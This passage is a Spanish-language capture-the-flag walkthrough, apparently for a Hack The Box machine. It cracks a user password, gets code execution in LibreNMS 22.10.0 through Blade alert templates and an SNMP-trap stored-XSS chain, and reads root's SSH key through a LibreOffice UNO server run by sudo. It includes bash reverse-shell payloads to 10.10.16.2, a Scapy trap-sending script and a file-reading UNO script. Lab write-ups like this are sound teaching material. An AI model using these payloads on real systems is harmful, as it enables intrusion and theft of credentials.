+                <p>Comprobando <code>/home</code>, veo dos usuarios con directorios home:</p>
+                <pre><code class="language-bash">ls -la /home
+drwxr-x--- 6 frank_dorky frank_dorky 4096 Feb 19 2024 frank_dorky
+drwxr-x--- 12 kai_relay kai_relay 4096 Feb 20 2024 kai_relay</code></pre>
+                
+                <p>Además, noto un usuario <code>librenms</code> que posee archivos en <code>/opt</code>:</p>
+                <pre><code class="language-bash">drwxrwx--x 27 librenms librenms 4096 Feb 19 2024 librenms</code></pre>
+                
+                <p>Usando hashcat, crackeo exitosamente la contraseña de frank_dorky:</p>
+                <pre><code class="language-plaintext">frank_dorky:manchesterunited</code></pre>
+                
+                <p>Con acceso SSH como <code>frank_dorky</code>, recupero la flag de usuario.</p>
+                
+                <h2>Descubriendo LibreNMS</h2>
+                <p>Comprobando servicios escuchando localmente, descubro varios puertos interesantes:</p>
+                <p><img src="./media/image6.png" alt="Salida de netstat mostrando múltiples servicios locales incluyendo puertos 3000, 8000 y otros" /></p>
+                
+                <p>La inspección de procesos revela que <code>puppeteer</code> se está ejecutando (probablemente para las pruebas de XSS en el puerto 37683). Examinando <code>/etc/nginx/conf.d/librenms.conf</code>, determino que el puerto 3000 aloja una instalación de LibreNMS con su document root en <code>/opt/librenms/html</code>.</p>
+                
+                <p>Configuro reenvío de puertos local SSH para acceder tanto al puerto 3000 (LibreNMS) como al puerto 8000 (otra aplicación personalizada):</p>
+                <pre><code class="language-bash">ssh -L 3000:localhost:3000 -L 8000:localhost:8000 frank_dorky@10.10.11.6</code></pre>
+                
+                <p>Ejecutando <code>whatweb</code> en el puerto 3000 confirma que LibreNMS se está ejecutando con PHP/Laravel:</p>
+                <pre><code class="language-bash">whatweb http://localhost:3000
+http://localhost:3000/login [200 OK] Bootstrap, Laravel, LibreNMS</code></pre>
+                
+                <p>Las credenciales de <code>frank_dorky</code> funcionan en el login de LibreNMS, y puedo ver que la versión es <strong>22.10.0</strong>.</p>
+                
+                <h2>Escalada de Privilegios LibreNMS - Método 1 (No Intencionado)</h2>
+                <p>Aunque el usuario <code>frank_dorky</code> no puede leer archivos en <code>/opt/librenms</code>, puedo ejecutar archivos dentro de él. LibreNMS incluye un script <code>adduser.php</code> para crear usuarios administrativos.</p>
+                
+                <p>Siguiendo la orientación del <a href="https://community.librenms.org/t/adding-admin-users-on-librenms/20782">foro de la comunidad de LibreNMS</a>, creo un usuario administrador:</p>
+                
+                <pre><code class="language-bash">cd /opt/librenms
+./adduser.php xd xd 10
+User xd added successfully</code></pre>
+                
+                <p>El parámetro <code>10</code> otorga privilegios completos de administrador. Tras hacer login, puedo crear plantillas de alerta, que soportan sintaxis Blade PHP - lo que significa que puedo inyectar código PHP arbitrario.</p>
+                
+                <p>Sin embargo, encuentro errores de consola relacionados con discrepancias de hostname. Para arreglar esto, modifico mi <code>/etc/hosts</code> local para apuntar <code>librenms.com</code> a localhost:</p>
+                
+                <p><img src="./media/image11.png" alt="Consola del navegador mostrando errores relacionados con hostname" /></p>
+                
+                <p>Tras arreglar el problema del hostname, modifico una plantilla de alerta para incluir una reverse shell PHP:</p>
+                <p><img src="./media/image4.png" alt="Editor de plantillas de alerta mostrando código PHP inyectado para reverse shell" /></p>
+                
+                <p>El payload que inyecto es:</p>
+                <pre><code class="language-php">@php
+system("bash -c 'bash -i >& /dev/tcp/10.10.16.2/443 0>&1'");
+@endphp</code></pre>
+                
+                <p>Cuando guardo la plantilla, el motor de plantillas Blade ejecuta mi código PHP, y recibo una reverse shell como usuario <code>librenms</code>.</p>
+                
+                <h2>Escalada de Privilegios LibreNMS - Método 2 (Ruta Intencionada)</h2>
+                <p>La ruta de explotación intencionada implica encadenar una vulnerabilidad de XSS almacenado con manejo de traps SNMP. LibreNMS soporta <a href="https://docs.librenms.org/Extensions/SNMP-Trap-Handler/">manejadores de SNMP trap</a>, y los datos de trap mostrados en el dashboard no están debidamente sanitizados.</p>
+                
+                <p>Según análisis detallados por <a href="https://www.sonarsource.com/blog/it-s-a-snmp-trap-gaining-code-execution-on-librenms/">SonarSource</a> y <a href="https://vulners.com/huntr/0C24BB60-4A8F-454F-9534-BA21B7470B55">Vulners</a>, puedo explotar esto mediante:</p>
+                
+                <ol>
+                    <li>Envío de un paquete SNMP trap malicioso conteniendo payload XSS</li>
+                    <li>El XSS se ejecuta en el navegador del admin al ver el dashboard de traps</li>
+                    <li>El payload XSS envía una petición POST para crear una plantilla Blade maliciosa</li>
+                    <li>La plantilla Blade contiene código PHP para una reverse shell</li>
+                </ol>
+                
+                <p>Primero, necesito identificar de qué dispositivo acepta traps LibreNMS. Comprobando <code>http://localhost:3000/maps/devicedependency</code>, veo que es <code>10.10.11.240</code>.</p>
+                
+                <p>Creo un script Python usando Scapy para enviar el SNMP trap malicioso:</p>
+                
+                <pre><code class="language-python">#!/usr/bin/env python3
+from scapy.all import *
+
+TARGET = '10.10.11.6'
+SOURCE = '10.10.11.240'
+PAYLOAD = 'system&lt;script src=http://10.10.16.2/payload.js&gt;&lt;/script&gt;'
+
+vl = []
+vl.append(SNMPvarbind(oid=ASN1_OID('1.3.6.1.6.3.1.1.4.1.0'), 
+                      value=ASN1_OID('1.2.3')))
+vl.append(SNMPvarbind(oid='', 
+                      value='foo\nSNMPv2-MIB::snmpTrapOID.0 HP-ICF-FAULT-FINDER-MIB::hpicfFaultFinderTrap\nHP-ICF-FAULT-FINDER-MIB::hpicfFfLogFaultType ' + PAYLOAD))
+
+s = SNMP(version=1, PDU=SNMPtrapv2(varbindlist=vl))
+p = IP(src=SOURCE, dst=TARGET)/UDP(dport=162)/s
+send(p)</code></pre>
+                
+                <p>El payload XSS carga <code>payload.js</code> desde mi servidor, que contiene:</p>
+                
+                <pre><code class="language-javascript">fetch('http://127.0.0.1:3000/ajax_form.php', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: 'type=alert-templates&template=@php%20system("bash%20-c%20\'bash%20-i%20>%26%20/dev/tcp/10.10.16.2/443%200>%261\'");%20@endphp&name=Foo'
+});</code></pre>
+                
+                <p>Este JavaScript envía una petición POST para crear una plantilla Blade con una reverse shell. Tras configurar listeners HTTP y netcat, ejecuto el script Python:</p>
+                
+                <pre><code class="language-bash">python3 snmptrap.py
+.
+Sent 1 packets.</code></pre>
+                
+                <p>Poco después, recibo la reverse shell como usuario <code>librenms</code>.</p>
+                
+                <h2>Movimiento Lateral a kai_relay</h2>
+                <p>En <code>/opt/librenms</code>, descubro un archivo <code>.custom.env</code> que contiene credenciales:</p>
+                <pre><code class="language-plaintext">kai_relay:mychemicalformulaX</code></pre>
+                
+                <p>Comprobando los privilegios sudo de <code>kai_relay</code> revela un permiso interesante:</p>
+                
+                <pre><code class="language-bash">sudo -l
+User kai_relay may run the following commands on forumlax:
+    (ALL) NOPASSWD: /usr/bin/office.sh</code></pre>
+                
+                <p>Examinando el script muestra que inicia un servidor headless LibreOffice con soporte de protocolo UNO:</p>
+                
+                <pre><code class="language-bash">cat /usr/bin/office.sh
+#!/bin/bash
+/usr/bin/soffice --calc --accept="socket,host=localhost,port=2002;urp;" --norestore --nologo --nodefault --headless</code></pre>
+                
+                <p>La versión es LibreOffice 7.3.7.2. Usando las credenciales de kai_relay, también puedo acceder a la aplicación personalizada en el puerto 8000:</p>
+                <p><img src="./media/image10.png" alt="Interfaz de la aplicación office mostrando capacidades de creación de archivos" /></p>
+                <p><img src="./media/image1.png" alt="Instrucciones de la aplicación explicando la funcionalidad del servidor UNO" /></p>
+                
+                <p>Esta aplicación permite crear y descargar documentos office. El botón verde "Start instance" ejecuta <code>sudo /usr/bin/office.sh</code>, iniciando un servidor UNO en el puerto 2002.</p>
+                
+                <h2>Escalada de Privilegios mediante LibreOffice UNO</h2>
+                <p>LibreOffice UNO (Universal Network Objects) permite el control programático de LibreOffice. Como el servidor UNO se ejecuta con privilegios de root (mediante sudo), potencialmente puedo acceder a archivos propiedad de root.</p>
+                
+                <p>Probando el puerto muestra que responde con datos del protocolo UNO:</p>
+                <pre><code class="language-bash">nc localhost 2002
+i��'com.sun.star.bridge.XProtocolPropertiesUrpProtocolProperties...</code></pre>
+                
+                <p>Investigando exploits UNO, encuentro <a href="https://www.exploit-db.com/exploits/46544">un exploit relacionado</a>, pero necesito adaptarlo para lectura de archivos arbitraria. Tras algo de investigación y pruebas, creo un script Python funcional usando la librería <code>uno</code>:</p>
+                
+                <pre><code class="language-python">import uno
+from com.sun.star.connection import NoConnectException
+from com.sun.star.beans import PropertyValue
+
+def load_file_as_csv(file_path, output_pdf_path):
+    """Loads a text file into LibreOffice Calc as CSV and saves as PDF."""
+    connection_string = "uno:socket,host=localhost,port=2002;urp;StarOffice.ComponentContext"
+    
+    try:
+        local_context = uno.getComponentContext()
+        resolver = local_context.ServiceManager.createInstanceWithContext(
+            "com.sun.star.bridge.UnoUrlResolver", local_context)
+        context = resolver.resolve(connection_string)
+        smgr = context.ServiceManager
+        desktop = smgr.createInstanceWithContext("com.sun.star.frame.Desktop", context)
+        
+        # Cargar archivo como CSV
+        load_props = (
+            PropertyValue("FilterName", 0, "Text - txt - csv (StarCalc)", 0),
+            PropertyValue("FilterOptions", 0, "44,34,0,1", 0),
+        )
+        
+        document = desktop.loadComponentFromURL("file://" + file_path, 
+                                                "_blank", 0, load_props)
+        
+        # Exportar como PDF
+        pdf_export_props = (PropertyValue("FilterName", 0, "calc_pdf_Export", 0),)
+        document.storeToURL("file://" + output_pdf_path, pdf_export_props)
+        document.dispose()
+        
+        print(f"Document loaded as CSV and saved as PDF to {output_pdf_path}")
+        
+    except NoConnectException:
+        print("Failed to connect to LibreOffice on port 2002.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+if __name__ == "__main__":
+    file_path = "/root/.ssh/id_rsa"
+    output_pdf_path = "/tmp/output_document.pdf"
+    load_file_as_csv(file_path, output_pdf_path)</code></pre>
+                
+                <p>Este script se conecta al servidor UNO, carga <code>/root/.ssh/id_rsa</code> como documento CSV (lo que preserva el contenido), y lo exporta como PDF a <code>/tmp/output_document.pdf</code> donde tengo acceso de lectura.</p>
+                
+                <p>Tras ejecutar el script, descargo el PDF, extraigo la clave privada SSH, la guardo con permisos apropiados y obtengo acceso root:</p>
+                
+                <pre><code class="language-bash">chmod 600 id_rsa
+ssh -i id_rsa root@10.10.11.6</code></pre>
+                
+                <p>Con acceso root obtenido, puedo recuperar la flag de root y completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
